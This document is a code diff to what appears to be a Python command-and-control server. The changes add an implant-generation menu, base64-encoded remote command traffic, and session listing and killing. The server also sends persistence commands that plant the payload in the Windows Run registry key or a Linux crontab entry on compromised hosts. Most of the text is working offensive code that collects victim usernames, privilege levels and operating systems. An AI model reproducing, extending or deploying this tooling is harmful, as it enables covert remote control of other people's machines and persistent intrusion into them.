@@ -1,13 +1,14 @@
+import base64
 import os
+import random
 import shutil
 import socket
+import string
+import subprocess
 import threading
 import time
 from datetime import datetime
-import random
-import string
-import subprocess
-import base64
+
 from rich.console import Console
 from rich.table import Table
 
@@ -132,31 +133,74 @@ def listener_handler():
     t1.start()
 
 
+def help():
+    print('''
+    Commands
+    ---------------------------------
+    Listener Commands
+    ---------------------------------------------------------------------------------------
+    listeners -g --generate           --> Generate Listener
+    
+    Session Commands
+    ---------------------------------------------------------------------------------------
+    sessions -l --list                --> List Sessions
+    sessions -i --interact            --> Interact with Session
+    sessions -k --kill <value>        --> Kill Active Session
+    
+    Payload Commands
+    ---------------------------------------------------------------------------------------
+    winplant py                       --> Windows Python Implant
+    winplang go                       --> Windows Golang Implant
+    exeplant go                       --> Windows Executable Implant (Golang)
+    exeplant py                       --> Windows Executable Implant (Python)
+    linplant py                       --> Linux Python Implant
+    linplang go                       --> Linux Golang Implant
+    pshell_shell                      --> Powershell Implant
+    
+    Client Commands
+    ---------------------------------------------------------------------------------------
+    persist / pt                      --> Persist Payload (After Interacting with Session) 
+    background / bg                   --> Background Session
+    exit                              --> Kill Client Connection
+    
+    Misc Commands
+    ---------------------------------------------------------------------------------------
+    help / h                          --> Show Help Menu
+    clear / cls                       --> Clear Screen
+    ''')
+
+
 def target_comm_channel(target_id, targets, num):
     while True:
-        message = input('send message#> ')
+        message = input(f'{targets[num][3]}/{targets[num][1]}#> ')
+        if len(message) == 0:
+            continue
+        if message == 'help':
+            pass
         communication_out(target_id, message)
         if message == 'exit':
+            message = base64.b64encode(message.encode())
             target_id.send(message.encode())
             target_id.close()
             targets[num][7] = 'Dead'
             break
         elif message == 'background':
             break
-        elif message == 'help':
-            pass
         elif message == 'persist':
             payload_name = input('[+] Enter the name of the payload to add to autorun: ')
             if targets[num][6] == 1:
                 persist_command_1 = f'cmd.exe /c copy {payload_name} C:\\Users\\Public'
-                target_id.send(persist_command_1.encode())
+                persist_command_1 = base64.b64encode(persist_command_1.encode())
+                target_id.send(persist_command_1)
                 persist_command_2 = f'reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v screendoor /t REG_SZ /d C:\\Users\\Public\\{payload_name}'
-                target_id.send(persist_command_2.encode())
+                persist_command_2 = base64.b64encode(persist_command_2.encode())
+                target_id.send(persist_command_2)
                 print(
                     '[+] Run this command to clean up the registry: \nreg delete HKEY_CURRENT_USER\SoftWare\Microsoft\Windows\CurrentVersion\Run /v screendoor /f')
             elif targets[num][6] == 2:
                 persist_command = f'echo "*/1 * * * * python3 /home/{targets[num][3]}/{payload_name}" | crontab -'
-                target_id.send(persist_command.encode())
+                persist_command = base64.b64encode(persist_command.encode())
+                target_id.send(persist_command)
                 print('[+] Run this command to clean up the crontab: \n crontab -r')
         else:
             response = communication_in(target_id)
@@ -170,39 +214,37 @@ def target_comm_channel(target_id, targets, num):
 
 def communication_handler():
     while True:
-        print('shhhhh')
         if kill_flag == 1:
             break
         try:
             remote_target, remote_ip = sock.accept()
             # remote_target.setblocking(False)
-            print('socket accepted')
-            username = remote_target.recv(1024).decode()
-            print(username)
-            admin = remote_target.recv(1024).decode()
-            print(admin)
-            op_sys = remote_target.recv(1024).decode()
 
-            print(op_sys)
+            username = remote_target.recv(1024).decode()
+            username = base64.b64decode(username).decode()
+            admin = remote_target.recv(1024).decode()
+            admin = base64.b64decode(admin).decode()
+            op_sys = remote_target.recv(1024).decode()
+            op_sys = base64.b64decode(op_sys).decode()
             if admin == 1:
                 admin_value = 'Yes'
             elif username == 'root':
                 admin_value = 'Yes'
             else:
-                print('no')
+
                 admin_value = 'No'
-            print('post-admin')
+
             if 'Windows' in op_sys:
                 pay_val = 1
             else:
                 pay_val = 2
             current_time = time.strftime("%H:%M:%S", time.localtime())
-            print(current_time)
+
             date = datetime.now()
-            print(date)
+
             time_record = (f"{date.month}/{date.day}/{date.year} {current_time}")
             host_name = socket.gethostbyaddr(remote_ip[0])
-            print(host_name)
+
             if host_name is not None:
                 targets.append(
                     [remote_target, f"{host_name[0]}@{remote_ip[0]}", time_record, username, admin_value, op_sys,
@@ -219,12 +261,21 @@ def communication_handler():
 def communication_in(target_id):
     print('[+] Awaiting response...')
     response = target_id.recv(1024).decode()
+    response = base64.b64decode(response)
+    response = response.decode().strip()
     return response
 
 
 def communication_out(target_id, message):
     message = str(message)
-    target_id.send(message.encode())
+    message = base64.b64encode(bytes(message, encoding='utf-8'))
+    target_id.send(message)
+
+
+def kill_sig(target_id, message):
+    message = str(message)
+    message = base64.b64encode(bytes(message, encoding='utf-8'))
+    target_id.send(message)
 
 
 def banner():
@@ -266,6 +317,23 @@ if __name__ == '__main__':
     while True:
         try:
             command = input('Enter command#> ')
+            if command == 'help':
+                help()
+            if command == 'exit':
+                quit_message = input('Ctrl-C\n[+] Do you really want to quit? (y/n)').lower()
+                if quit_message == 'y':
+                    targets_length = len(targets)
+                    for target in targets:
+                        if target[7] == 'Dead':
+                            pass
+                        else:
+                            communication_out(target[0], 'exit')
+                    kill_flag = 1
+                    if listener_counter > 0:
+                        sock.close()
+                    break
+                else:
+                    continue
             if command == 'listeners -g':
                 host_ip = input('[+] Enter the IP address to listen on: ')
                 host_port = input('[+] Enter the port to listen on: ')
@@ -323,6 +391,15 @@ if __name__ == '__main__':
                             print('[-] You cannot interact with a dead session.')
                     except IndexError:
                         print(f'[-] Session {num} does not exist')
+            if command.split(" ")[0] == 'kill':
+                try:
+                    num = int(command.split(" ")[1])
+                    target_id = (targets[num])[0]
+                    kill_sig(target_id, 'exit')
+                    targets[num][7] = 'Dead'
+                    print(f'[+] Session {num} terminated.')
+                except (IndexError, ValueError):
+                    print(f'[-] Session {num} does not exist.')
         except KeyboardInterrupt:
             quit_message = input('Ctrl-C\n[+] Do you really want to quit? (y/n)').lower()
             if quit_message == 'y':
